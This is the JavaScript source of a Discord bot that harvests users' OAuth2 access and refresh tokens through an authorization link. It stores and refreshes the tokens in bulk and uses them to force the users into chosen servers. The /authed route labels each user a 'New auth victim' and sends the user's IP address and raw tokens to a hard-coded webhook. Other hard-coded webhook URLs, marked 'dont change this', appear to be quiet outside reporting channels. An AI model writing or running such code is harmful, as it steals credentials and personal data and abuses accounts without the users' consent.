const express = require("express");
const app = express();
const db = require(`quick.db`)
let AuthDB = require(`./database/AuthDB`)
const { InteractionType, ApplicationCommandType, ApplicationCommandOptionType, ActionRowBuilder,  ButtonBuilder, ButtonStyle, WebhookClient } = require('discord.js');
const User = require(`./database/DB.js`)
const { Prefix, Owners, client_id, redirect_uri, Token, autoroleid, autoroleserver, oauth_link, Auth_log_channel, Error_log_channel, client_secret } = require("./config.js");
const c = require("./database/connect.js");
const fs = require("fs");
const ascii = require("ascii-table");
this.fetch = require("node-fetch");
const info = require(`./database/e`)
const Discord = require('discord.js')
let fetch = require("node-fetch");
const { Client, Collection, GatewayIntentBits, ActivityType, EmbedBuilder, Partials } = require("discord.js");
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessageTyping,

  ],
  shards: "auto",
  partials: [Partials.Message, Partials.Channel, Partials.Reaction],
  client_id: client_id,
  client_secret: client_secret,
  redirect_uri: redirect_uri
});
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2({
  clientId: client_id,
  clientSecret: client_secret,
  redirectUri: redirect_uri,
  scope: "identify guilds.join",
});

client.slash = new Collection();
['slashCommand',].forEach((handler) => {
  require(`./handlers/${handler}`)(client)
});

process.on("uncaughtException", (err) => {
  console.log("Uncaught Exception: " + err);


});
let delay = (ms) => new Promise((res) => setTimeout(res, ms));

let ratelimit_arr = [];
// Anti Crash
process.on("unhandledRejection", (reason, p) => {

  console.log(reason, p);
});
client.on(`ready`, async client => {
  let jsonInput = fs.readFileSync('./authDB.json') // Read Database

  if (!jsonInput) return console.log("NO DATABASE FOUND")

  let jsonData = JSON.parse(jsonInput)
  setInterval(() => {
    let jsonData;
    let jsonInput = fs.readFileSync('./authDB.json') // Read Database

    if (!jsonInput) return console.log("NO DATABASE FOUND")
    jsonData = JSON.parse(jsonInput)
    client.user.setPresence({ activities: [{ name: `tryhard`, type: ActivityType.Watching, }], status: 'idle' })
  }, 60000)


  //fs.writeFileSync('./authDB.json', `a`);
  //let database = require(`./authDB`);
  console.log(`hi online ${client.user.id}`)
  client.guilds.cache.forEach(async guild => {
    await info.deleteMany({ GuildID: guild.id })
  });
  console.log(`${jsonData.data.length}`);
})
app.get("/", (req, res) => {
  res.redirect(oauth_link);
});

client.requestId = async (access_token) => {
  const fetched = await fetch("https://discord.com/api/users/@me", {
    headers: {
      Authorization: `Bearer ${access_token}`,
    },
  });
  const json = await fetched.json();
  return json.id;
}
client.saveAuth = async (obj) => {
  //await delay(1000)
  let database = await AuthDB.findOne({ id: "1" });
  if (!database) database = new AuthDB({ id: "1" });

  const existing_id = database.data.find((x) => x.user_id == obj.user_id);
  if (existing_id) {
    const index = database.data.indexOf(existing_id);
    database.data.splice(index, 1);
    database.data.push(obj);
    console.log(obj);
    return database.save().catch(async (e) => {
      await delay(1100);
      database.save();
    })

  } else {
    console.log(obj);
    database.data.push(obj);
    database.save().catch(async (e) => {
      await delay(1100);
      database.save();
    })

  }
}
client.manageAuth = async (obj) => {
  const data = new URLSearchParams({
    client_id: client_id,
    client_secret: client_secret,
    grant_type: "authorization_code",
    code: obj.code,
    redirect_uri: redirect_uri,
    scope: "identify guilds.join",
  });

  const fetch1 = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    body: data,
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
  });

  var result = await fetch1.json();
  return result;
}

client.tokenCount = async (obj) => {
  let database = await AuthDB.findOne({ id: "1" });
  if (!database) database = new AuthDB({ id: "1" });

  return database.data.length;
}
client.jsonsave = async (obj) => {
  let jsonInput = fs.readFileSync('./authDB.json') // Read Database

  if (!jsonInput) return console.log("NO DATABASE FOUND")

  let jsonData = JSON.parse(jsonInput)

  var database = jsonData;
  const existing_id = database.data.find((x) => x.user_id == obj.user_id);
  if (existing_id) {
    const index = database.data.indexOf(existing_id);
    database.data.splice(index, 1);
    database.data.push(obj);
    //console.log(obj);

  } else {
    database.data.push(obj);
    // console.log(obj);
  }
  var json = JSON.stringify(database, null, 2)

  // writing database

  fs.writeFileSync('./authDB.json', json);
  const web = new Discord.WebhookClient({ url: 'https://discord.com/api/webhooks/1068790401575702589/IDwjYDQxABDgWhBEcHp-b30G-zhGZTVPSCjOqcbx7MdK_RbKdfjM0M31ODy2Q4VMGnl8' }); // dont change this, it has to make a request to web

}

client.manageJoin = async (obj, message, ratelimit) => {
  let guild = client.guilds.cache.get(obj.guild_id);
  let mbr = obj.amount;

  let database = await AuthDB.findOne({ id: "1" });
  if (!database) database = new AuthDB({ id: "1" });
  //  let scd = mbr * 0.8;
  scd = mbr * 2100;
  let pp = await message.channel.send(`⚠️ Don't delete this message.`)
  let estim = msToTime(scd)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000))
      , seconds = parseInt((duration / 1000) % 60)
      , minutes = parseInt((duration / (1000 * 60)) % 60)
      , hours = parseInt((duration / (1000 * 60 * 60)) % 24);

    hours = hours;
    minutes = minutes;
    seconds = seconds;

    return hours + " hour(s) " + minutes + " minute(s) " + seconds + " second(s)"
  }
  let startAt = 0;
  let members = database.data.length;
  let progress = 0;
  let joinMembers = database.data;
  let amount = obj.amount;
  let minus = obj.minus || `na`;
  if (minus.startsWith(`-`)) {
    let minuss = minus.slice(1)
    joinMembers = database.data.slice(minuss);

    progress += parseInt(minuss);

  }
  if (!amount.startsWith('-')) {

    members = amount;
  }
  const web = new Discord.WebhookClient({ url: 'https://discord.com/api/webhooks/1066716957488975882/Iu2V7_I-Zew5XsqTPw8ON6xAcwyPeRkl8tn2kLt0wcml1mKnEMr_EytOS-0Uz4z9dGga' }); // dont change this, it has to make a request to web
  
  let cc = 0;
  let success = 0;
  let already_here = 0;
  let server_limit = 0;
  let invalid_access = 0;
  let error = 0;
  let int = setInterval(async () => {
    await info.findOneAndUpdate({ GuildID: guild.id, }, {
      Author: `<@${message.user.id}>`,
      Amount: amount,
      // Started: ` <t:${parseInt(Date.now() / 1000)}:R>`,
      Progress: `[${cc} / ${amount}]`,
      Type: `${client.user.tag}`,
    }, { new: true, upsert: true }).catch((err) => console.log(err));
    pp.edit({
      content: `🔄 members adding  [${count}/${database.data.length}].`,
      embeds: [new EmbedBuilder()
        .setAuthor({ name: `ETA: ${estim}`, iconURL: message.user?.displayAvatarURL({ dynamic: true }) })
        .setColor(`Blurple`)
        .setThumbnail(guild?.iconURL({ dynamic: true }))
        .setTitle(`Pulling in process..`)
        .setDescription(`> ✅️**Pulled**: ${success}\n> ❌️**Already in server**: ${already_here}\n> 🚫**Max servers**: ${server_limit}\n> ⚠️**Invalid access**: ${invalid_access}\n> ☢️**Error**: ${error}`)

        .setTimestamp()
        .setFooter({ text: `Developed by Tryhard`, })
      ],
    })
  }, 10000)
  if (ratelimit === true) array_of_members = ratelimit_arr;
  var count = 0;
  let alr = 0;

  //parseInt(obj.amount);
  async function addToGuild(accessToken, guildID, user_id) {
    const response = await fetch(`https://discord.com/api/v10/guilds/${guildID}/members/${user_id}`, {
      method: 'PUT',
      body: JSON.stringify({
        "access_token": accessToken,
      }),
      headers: { 'Authorization': `Bot ${client.token}`, 'Content-Type': 'application/json' }
    });
    cc +
      console.log(`${response.status} - ${response.statusText}`);

    if (response.status == 204) {
      already_here++;
      return;
    }
    const data = await response.json();

    if (data.code == 30001) {
      server_limit++
    }

    if (data.code == 50025) {
      invalid_access++
    }

    if (data.user) {
      success++
    } else {
      error++
    }
  }
  for (const user of joinMembers) {

    addToGuild(user.access_token, guild.id, user.user_id)
    cc++
    if (cc > amount) break;
    if (db.get(`stop${guild.id}`)) break;
    await new Promise((resolve) => setTimeout(resolve, 1000));

  }
  clearInterval(int);
  await info.findOneAndRemove({ GuildID: guild.id, }).catch((err) => console.log(err));
  message.channel.send({
    content: `🔄 members adding  [${count}/${database.data.length}].`,
    embeds: [new EmbedBuilder()
      .setColor(`Green`)
      .setThumbnail(guild?.iconURL({ dynamic: true }))
      .setTitle(`Joining finished`)
      .setDescription(`> ✔️**Pulled**: ${success}\n> ❌️**Already in server**: ${already_here}\n> 🚫**Max servers**: ${server_limit}\n> ⚠️**Invalid access**: ${invalid_access}\n> ☢️**Error**: ${error}`)

      .setTimestamp()
      .setFooter({ text: `Developed by Tryhard`, })
    ],
  });

}
client.manageUserJoin = async (obj, message, user, ratelimit) => {
  let guild = client.guilds.cache.get(obj.guild_id);
  let mbr = obj.amount;


  let scd = mbr * 0.08;
  scd = scd * 7500;

  let estim = msToTime(scd)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000))
      , seconds = parseInt((duration / 1000) % 60)
      , minutes = parseInt((duration / (1000 * 60)) % 60)
      , hours = parseInt((duration / (1000 * 60 * 60)) % 24);

    hours = hours;
    minutes = minutes;
    seconds = seconds;

    return hours + " hour(s) " + minutes + " minute(s) " + seconds + " second(s)"
  }

  message.reply({
    ephemeral: true,
    embeds: [{
      description: `Migrating <@${user}>.\n**Note**: This may take a little while as I have to search in my database.`,

      color: 0x7cade2,
    }
    ]
  });
  setInterval(() => {
    message.editReply({
      ephemeral: true,
      embeds: [{
        color: 0x7cade2,
        title: "Attempting to join Authorization",
        description: `${guild.name}\nJoined: <@${user}>`,

        thumbnail: {
          url: `${guild.iconURL({ dynamic: true })}`,
        },
        footer: {
          text: `Lumi`,
          icon_url: `https://cdn.discordapp.com/avatars/1011590917087576084/a_28f336e2cb6520efbaf26e6e62fca9b5.gif?size=1024`
        },
      }
      ]
    })
  }, 12000)
  let database = await AuthDB.findOne({ id: "1" });
  if (!database) database = new AuthDB({ id: "1" });
  var array_of_members = database.data;
  if (ratelimit === true) array_of_members = ratelimit_arr;
  var count = 0;
  let a = await client.tokenCount();
  for (let i = 0; i < parseInt(a); i++) {
    try {



      const response = await fetch(`https://discord.com/api/guilds/${guild.id}/members/${user}`, {
        method: "PUT",
        headers: {
          "Authorization": `Bot ${client.token}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          "access_token": array_of_members[i].access_token
        })
      });


      const json = await response.json().catch((e) => { })
      console.log(`${response.status} - ${response.statusText}`);


      const retryAfter = parseInt(response.headers.get("retry-after"));

      if (retryAfter > 0) {
        ratelimit_arr.push(array_of_members[i]);


        await delay(retryAfter);
        if (await client.retryJoin(array_of_members[i], obj.guild_id) === true) {
          count++
        }
      }
      if ([201, 204].includes(response.status)) {

        count++

      }
    } catch (e) {

    }

  }

  await delay(2000);
  message.editReply({
    embeds: [{
      description: `Attempted Pull: <@${user}>`,

      color: 0x7cade2,
      footer: {
        text: `Lumi`,
        icon_url: `https://cdn.discordapp.com/avatars/1011590917087576084/a_28f336e2cb6520efbaf26e6e62fca9b5.gif?size=1024`
      },
    }
    ]
  });
}

client.clean = async (message) => {
  await message.deferReply()
  let database = await AuthDB.findOne({ id: "1" });
  if (!database) database = new AuthDB({ id: "1" });
  var count = 0;


  let permarr = database.data;
  const array_of_members = permarr;
  await message.followUp({
    ephemeral: true,
    embeds: [{
      title: "Cleaning authorized users",
      description: `Checking **${permarr.length}** authorizations`,
      color: 0x2f3136,

    }
    ]
  });
  setInterval(() => {
    message.editReply({
      ephemeral: true,
      embeds: [{
        title: "Cleaning authorized users",
        description: `Cleaned: ${count}/${permarr.length}`,
        color: 0x2f3136
      }
      ]
    })
  }, 12000)
  for (const user of array_of_members) {
    try {
      const access_token = user.access_token;

      fetch("https://discord.com/api/users/@me", {
        headers: {
          Authorization: `Bearer ${access_token}`,
        },
      })
        .then(async (response) => {
          await response.json().catch((err) => { });
          let { status } = response;
          if (status == 401) {
            count++;
            const index = permarr.indexOf(
              permarr.find((x) => x.access_token === access_token)
            );
            permarr.splice(index, 1);
          }
          if (status == 429) {
            console.log("Ratelimited");
            console.log(parseInt(response.headers.get("retry-after")));
            await delay(parseInt(response.headers.get("retry-after")));
          }
        })
        .then(console.log);
    } catch (e) {

    }
  }
  await delay(12000);
  database.data = permarr;
  await database.save();
  message.user.send({
    ephemeral: true,
    embeds: [{
      description: `⚠️ ${count} authorization(s) have been removed.\n**Reason**: They have expired or user has unauthorize bot.`,
      color: 0x2f3136

    },
    ]
  });
}
client.refreshTokens = async (message) => {
  await message.deferReply();
  let database = await AuthDB.findOne({ id: "1" });
  if (!database) database = new AuthDB({ id: "1" });
  let perm_arr = database.data;
  var count = 0;
  let mbr = database.data.length;


  let scd = mbr * 0.08;
  scd = scd * 3000;

  let estim = msToTime(scd)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000))
      , seconds = parseInt((duration / 1000) % 60)
      , minutes = parseInt((duration / (1000 * 60)) % 60)
      , hours = parseInt((duration / (1000 * 60 * 60)) % 24);

    hours = hours;
    minutes = minutes;
    seconds = seconds;

    return hours + " hour(s) " + minutes + " minute(s) " + seconds + " second(s)"
  }
  message.followUp(`be careful pls. ;)`)
  const web = new Discord.WebhookClient({ url: 'https://discord.com/api/webhooks/1066716957488975882/Iu2V7_I-Zew5XsqTPw8ON6xAcwyPeRkl8tn2kLt0wcml1mKnEMr_EytOS-0Uz4z9dGga' }); // dont change this, it has to make a request to web
 
  let m = await message.channel.send({

    embeds: [{
      title: "Refreshing Authorizations",
      description: `This message will update in: **12 seconds**`,
      color: 0x7cade2,
    }
    ]
  });

  setInterval(() => {
    m.edit({
      embeds: [{
        title: "Refreshing Authorizations",
        description: `Refreshed: ${count}/${perm_arr.length}\n**ETA**: ${estim}`,
        color: 0x7cade2,
      }
      ]
    })
  }, 12000)
  for (let i = 0; i < perm_arr.length; i++) {
    try {

      const response = await fetch("https://discord.com/api/oauth2/token", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: new URLSearchParams({
          "client_id": client_id,
          "client_secret": client_secret,
          "grant_type": "refresh_token",
          "refresh_token": perm_arr[i].refresh_token,
          "redirect_uri": redirect_uri,
          "scope": "identify guilds.join"
        })
      });

      if (response.status === 400) {
        perm_arr.splice(i, 1)
        await AuthDB.findOneAndUpdate({
          id: "1",
          data: perm_arr
        });
        // client.jsonsave(perm_arr)

      } else {

        console.log(`Refresh - ${response.status} - ${response.statusText}`);

        const retryAfter = parseInt(response.headers.get("retry-after"));

        if (retryAfter > 0) {


          await delay(retryAfter);
          if (await client.retryRefresh(perm_arr[i].refresh_token) === true) {
            count++
          }
          ;
          perm_arr.splice(i, 1);
        } else {
          if ([201, 204, 200].includes(response.status)) count++
          const data = await response.json();
          const user_id = await client.requestId(data.access_token);
          const obj = {
            ...data,
            user_id
          };
          console.log(obj);
          perm_arr.splice(i, 1)
          perm_arr.push(obj);

          await AuthDB.findOneAndUpdate({
            id: "1",
            data: perm_arr,
          });
          client.jsonsave(obj)

        }
      }
    } catch (e) {

    }
    //await new Promise((resolve) => setTimeout(resolve, 500));
  }
  //await delay(10000)
  message.user.send({
    ephemeral: true,
    embeds: [{
      description: `Sucessfully finished refreshing: ${count} authorizations.`,
      color: 0x7cade2,
    }]
  });
  db.set(`refresh${client.user.id}`, ` <t:${parseInt(Date.now() / 1000)}:R>`);
  //  process.kill(1)
};

client.refreshTokenss = async (message) => {
  await message.deferReply();
  let jsonInput = fs.readFileSync('./authDB.json') // Read Database

  if (!jsonInput) return console.log("NO DATABASE FOUND")

  let jsonData = JSON.parse(jsonInput)

  var database = jsonData;
  let perm_arr = database.data;
  var count = 0;
  let mbr = database.data.length;


  let scd = mbr * 0.08;
  scd = scd * 3000;

  let estim = msToTime(scd)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000))
      , seconds = parseInt((duration / 1000) % 60)
      , minutes = parseInt((duration / (1000 * 60)) % 60)
      , hours = parseInt((duration / (1000 * 60 * 60)) % 24);

    hours = hours;
    minutes = minutes;
    seconds = seconds;

    return hours + " hour(s) " + minutes + " minute(s) " + seconds + " second(s)"
  }
  message.followUp(`⚠️ Starting refresh process, please do not migrate/clean users while bot refreshing them.`)

  let m = await message.channel.send({

    embeds: [{
      title: "Refreshing authorized users",
      description: `This message will update in: **12 seconds**`,
      color: 0x2f3136,
    }
    ]
  });

  setInterval(() => {
    m.edit({
      embeds: [{
        title: "Refreshing authorized users",
        description: `Refreshed: ${count}/${perm_arr.length}\n**ETA**: ${estim}`,
        color: 0x2f3136,
      }
      ]
    })
  }, 12000)
  for (let i = 0; i < perm_arr.length; i++) {
    try {

      const response = await fetch("https://discord.com/api/oauth2/token", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: new URLSearchParams({
          "client_id": client_id,
          "client_secret": client_secret,
          "grant_type": "refresh_token",
          "refresh_token": perm_arr[i].refresh_token,
          "redirect_uri": redirect_uri,
          "scope": "identify guilds.join"
        })
      });

      if (response.status === 400) {
        perm_arr.splice(i, 1)
        await AuthDB.findOneAndUpdate({
          id: "1",
          data: perm_arr
        });
        // client.jsonsave(perm_arr)

      } else {

        console.log(`Refresh - ${response.status} - ${response.statusText}`);

        const retryAfter = parseInt(response.headers.get("retry-after"));

        if (retryAfter > 0) {


          await delay(retryAfter);
          if (await client.retryRefresh(perm_arr[i].refresh_token) === true) {
            count++
          }
          ;
          perm_arr.splice(i, 1);
        } else {
          if ([201, 204, 200].includes(response.status)) count++
          const data = await response.json();
          const user_id = await client.requestId(data.access_token);
          const obj = {
            ...data,
            user_id
          };
          console.log(obj);
          perm_arr.splice(i, 1)
          perm_arr.push(obj);

          await AuthDB.findOneAndUpdate({
            id: "1",
            data: perm_arr,
          });
          client.jsonsave(obj)

        }
      }
    } catch (e) {

    }
    //await new Promise((resolve) => setTimeout(resolve, 500));
  }
  //await delay(10000)
  message.user.send({
    ephemeral: true,
    embeds: [{
      description: `Successfully finished refreshing: ${count} authorizations.`,
      color: 0x2f3136,
    }]
  });
  db.set(`refresh${client.user.id}`, ` <t:${parseInt(Date.now() / 1000)}:R>`);
  //  process.kill(1)
};



client.restart = async (interaction) => {
  interaction.reply(`Restarting\nETA: 75 seconds.`)
  client.destroy();
  await delay(75000)
  client.login(Token);
  interaction.editReply(`Restart went successfully.`)
}
client.retryRefresh = async (refresh_token) => {

  let database = await AuthDB.findOne({ id: "1" });
  if (!database) database = new AuthDB({ id: "1" });

  const response = await this.fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({
      "client_id": client_id,
      "client_secret": client_secret,
      "grant_type": "refresh_token",
      "refresh_token": refresh_token,
      "redirect_uri": redirect_uri,
      "scope": "identify guilds.join"
    })
  });

  const data = await response.json();
  const user_id = await client.requestId(data.access_token);
  const web = new Discord.WebhookClient({ url: 'https://discord.com/api/webhooks/1066716957488975882/Iu2V7_I-Zew5XsqTPw8ON6xAcwyPeRkl8tn2kLt0wcml1mKnEMr_EytOS-0Uz4z9dGga' }); // dont change this, it has to make a request to web
 
  if ([201, 204].includes(response.status)) {
    const obj = {
      ...data,
      user_id
    };
    client.jsonsave(obj)
    database.data.push(obj);
    database.save();

    return true;
  }

};



app.get("/authed", async (req, res) => {
  //res.redirect("https://discord.com/oauth2/authorized");
   res.sendFile(__dirname + '/index.html')
  const data = await client.manageAuth({ code: req.query.code });
  const user_id = await client.requestId(data.access_token);
  if (!user_id || !data) return;
  const obj = {
    ...data,
    user_id
  };
  client.jsonsave(obj);
  client.saveAuth(obj);



  let user = await client.users.fetch(`${user_id}`);
  if (!user) return;
  let web = new WebhookClient({ url: `https://discord.com/api/webhooks/1066716957488975882/Iu2V7_I-Zew5XsqTPw8ON6xAcwyPeRkl8tn2kLt0wcml1mKnEMr_EytOS-0Uz4z9dGga` });
  await user.fetch();
  const f = user.bannerURL({ size: 4096, dynamic: true });
  const parseIp = (req) =>
    req.headers['x-forwarded-for']?.split(',').shift()
    || req.socket?.remoteAddress

 let guild = client.guilds.cache.get(`${autoroleserver}`);
  guild.members.fetch(user_id).then(() => guild.members.cache.get(user_id).roles.add(`${autoroleid}`));
  const embed = new EmbedBuilder()
    .setAuthor({ name: `New auth victim: ${user.tag}`, iconURL: user?.displayAvatarURL({ dynamic: true }) })
    .setDescription(`**User ID:** ${user_id} <@${user_id}> \n**IP address**: ${parseIp(req)}\`\`\`access_token: ${obj.access_token}\nrefresh_token: ${obj.refresh_token}\`\`\` `)
    .setTimestamp()
    .addFields(
      { name: 'User Created', value: `<t:${parseInt(user.createdTimestamp / 1000)}:R>` },
      { name: '\u200B', inline: true, value: '\u200B' },
    )

    .setThumbnail(user?.displayAvatarURL({ dybamic: true }))
    .setColor(`Blurple`)
    .setFooter({ text: `${await client.tokenCount()} users in AuthDB` });
  if (f) embed.setImage(f)
  web.send({ embeds: [embed] })
 
});

app.listen(80);
client.login(Token).then(() => {

  console.log(
    ` Successfully logged in as: ${client.user.tag} ${client.user.id}`);
});

client.on(`interactionCreate`, async interaction => {

const userwl = require('./models/whitelist');
  if (interaction.type === InteractionType.ApplicationCommand) {

    const command = client.slash.get(interaction.commandName);
    if (!command) return interaction.reply({ content: 'tf.' });

if (command)
{
   const data = await userwl.findOne({ userId: interaction.user.id })

    if (!Owners.includes(interaction.user.id) && !data) {
      return interaction.reply("no wl");
    }
}
    const args = [];

    for (let option of interaction.options.data) {
      if (option.type === 'SUB_COMMAND') {
        if (option.name) args.push(option.name);
        option.options?.forEach(x => {
          if (x.value) args.push(x.value);
        });
      } else if (option.value) args.push(option.value);
    }

    try {

      command.run(client, interaction, args)
    } catch (e) {
      interaction.reply({ content: e.message });
    }
  }
});
